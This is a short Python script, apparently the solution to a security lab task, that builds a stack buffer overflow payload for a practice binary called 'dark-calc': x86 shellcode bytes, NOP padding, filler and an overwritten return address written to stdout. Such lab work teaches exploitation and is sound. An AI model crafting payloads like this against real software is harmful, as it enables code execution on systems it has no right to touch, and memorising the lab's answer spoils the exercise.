#!/usr/bin/env python3
"""Task 2: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys

shellcode = (
    b"\xbf\x04\x00\x00\x00"
    b"\xb8\x87\x1a\x40\x00"
    b"\xff\xd0"
)

payload = shellcode.ljust(16, b"\x90")
payload += b"B" * 8
payload += (0x721000800fd0).to_bytes(8, "little")

sys.stdout.buffer.write(payload + b"\n")
